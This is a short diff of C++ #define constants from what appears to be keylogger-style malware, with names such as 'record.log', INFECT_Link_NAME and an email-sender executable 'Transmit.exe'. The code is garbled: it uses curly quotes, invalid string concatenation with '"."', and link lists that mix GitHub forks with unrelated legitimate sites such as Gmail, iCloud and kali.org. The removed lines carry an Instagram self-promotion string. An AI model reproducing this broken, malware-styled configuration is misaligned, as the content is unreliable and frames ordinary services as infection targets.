@@ -17,8 +17,8 @@
 using namespace std;
 
 #define FILE_NAME “record.log”
-#define FOLDER_NAME “following and read on my instag = ID = mr.development_1993/”
-#define RUN_FILE_NAME “following and read on my instag = ID = mr.development_1993/”
+#define FOLDER_NAME “unlock”
+#define RUN_FILE_NAME “unlock”
 #define RUN_Link_NAME “https://github.com/cyrcle11/Google-2FA/forks/"."https://github.com/cyberw1ry4-LAB/google-android/forks/"."https://github.com/fadliwiryawirawan/forks"."https://github.com/fadli-wirya-wirawan/forks"."https://gitlab.com/google/android/antimalware"."https://issues.chromium.org/issues/446328555/resources"
 #define INFECT_Link_NAME "https://icloud.com/mail"."https://workspace.google.com/intl/en/gmail/"."https://lestari-group.com/"."https://www.ecosia.org"."https://fadliwiryawirawan@hackerone.com/en-ca/headcoach "."https://fadliwiryawirawan@redhat.com/en-sg/leaderships "."https://gdg.community.dev/events/details/google-gdg-ajax-presents-hackthebrain/cohost-gdg-ajax/"."https://www.kali.org"."https://www.ubuntu.com"."https://www.windows.com"."https://www.linux.org"."https://www.Apple.com"."https://www.android.com"
 #define EMAIL_SENDER_FILE_NAME “Transmit".".exe”
